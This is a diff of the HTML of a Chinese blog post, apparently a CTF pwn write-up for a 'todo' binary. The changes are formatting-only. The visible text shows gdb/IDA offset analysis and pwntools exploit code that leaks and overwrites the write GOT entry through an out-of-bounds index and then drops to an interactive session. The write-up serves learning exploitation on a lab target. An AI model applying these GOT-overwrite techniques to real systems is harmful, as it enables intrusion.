@@ -85,24 +85,22 @@ read_line(&amp;todos[idx*TODO_LENGTH], TODO_LENGTH);
 
 <p>使用 gdb 调试，<code class="highlighter-rouge">set follow-fork-mode parent</code> 然后 <code class="highlighter-rouge">b main</code> <code class="highlighter-rouge">p &amp;todos</code> 可以看到内存地址。</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>gdb-peda$ p &amp;todos
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ p &amp;todos
 $1 = (&lt;data variable, no debug info&gt; *) 0x555555757140 &lt;todos&gt;
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>在 IDA 中，也可以看到 <code class="highlighter-rouge">todos</code> 和 <code class="highlighter-rouge">got</code> 表距离也非常近，写一个小程序算一下</p>
 
 <p><img src="https://storage.virusdefender.net/blog/images/790/1.png" alt="" /></p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="n">base</span> <span class="o">=</span> <span class="mh">0x203140</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">base</span> <span class="o">=</span> <span class="mh">0x203140</span>
 <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">10</span><span class="p">):</span>
     <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">base</span> <span class="o">-</span> <span class="n">i</span> <span class="o">*</span> <span class="mi">48</span><span class="p">)</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>结合 IDA 的结果和计算输出的结果，可以标记出来一些有用的数据</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>0x203140 -&gt; todos
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x203140 -&gt; todos
 0x203110
 0x2030e0
 0x2030b0
@@ -113,12 +111,11 @@ $1 = (&lt;data variable, no debug info&gt; *) 0x555555757140 &lt;todos&gt;
 0x202ff0
 0x202fc0
 0x202f90
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>比如先读一下 <code class="highlighter-rouge">write</code> 的地址</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>[-------------------------------------code-------------------------------------]
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[-------------------------------------code-------------------------------------]
    0x555555554900 &lt;puts@plt&gt;:	jmp    QWORD PTR [rip+0x202712]        # 0x555555757018
    0x555555554906 &lt;puts@plt+6&gt;:	push   0x0
    0x55555555490b &lt;puts@plt+11&gt;:	jmp    0x5555555548f0
@@ -133,26 +130,24 @@ $1 = (&lt;data variable, no debug info&gt; *) 0x555555757140 &lt;todos&gt;
        0x555555554926 &lt;strlen@plt+6&gt;:	push   0x2
                                                                   JUMP is taken
 [------------------------------------stack-------------------------------------]
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>重新画一下数据分布图</p>
 
-<div class="highlighter-rouge"><pre class="highlight"><code>0x555555757140 -&gt; todos
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>0x555555757140 -&gt; todos
 0x555555757110
 0x5555557570e0
 0x5555557570b0
 0x555555757080
 0x555555757050
 0x555555757020 =&gt; 0x555555554916 -&gt; write@plt+6
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>由以前的知识就知道 <code class="highlighter-rouge">0x555555757020</code> 就是 <code class="highlighter-rouge">write</code> 的 got 表的地址，减去刚才已知的 <code class="highlighter-rouge">todos</code> 的位置，正好是 <code class="highlighter-rouge">(0x555555757020 - 0x555555757140) / 48 == -6</code>。</p>
 
 <p>可以先构造一个读取 <code class="highlighter-rouge">write</code> 的 got 表地址 exp</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">unpack</span>
 
 <span class="n">proc</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./todo"</span><span class="p">)</span>
@@ -166,8 +161,7 @@ $1 = (&lt;data variable, no debug info&gt; *) 0x555555757140 &lt;todos&gt;
 <span class="n">write_addr</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">write_addr</span><span class="p">)[</span><span class="mi">0</span><span class="p">]</span>
 
 <span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">write_addr</span><span class="p">)</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>其中 <code class="highlighter-rouge">&lt;Q</code> 是指定按照小端序读取 8 个字节作为一个数字。因为这时候 write 函数还没有被解析，所以 got 表中的 <code class="highlighter-rouge">write</code> 还是指向 <code class="highlighter-rouge">write@plt+6</code> 的。</p>
 
@@ -175,7 +169,7 @@ $1 = (&lt;data variable, no debug info&gt; *) 0x555555757140 &lt;todos&gt;
 
 <p>完整 exp 如下</p>
 
-<div class="language-python highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">unpack</span><span class="p">,</span> <span class="n">pack</span>
 
 <span class="n">proc</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s">"./todo"</span><span class="p">)</span>
@@ -197,8 +191,7 @@ $1 = (&lt;data variable, no debug info&gt; *) 0x555555757140 &lt;todos&gt;
 <span class="n">proc</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">"AAAAAAAA"</span> <span class="o">+</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">write_addr</span> <span class="o">+</span> <span class="mh">0x2a</span><span class="p">)[:</span><span class="mi">8</span><span class="p">]</span> <span class="o">+</span> <span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
 
 <span class="n">proc</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre>
-</div>
+</code></pre></div></div>
 
 <p>参考</p>
 
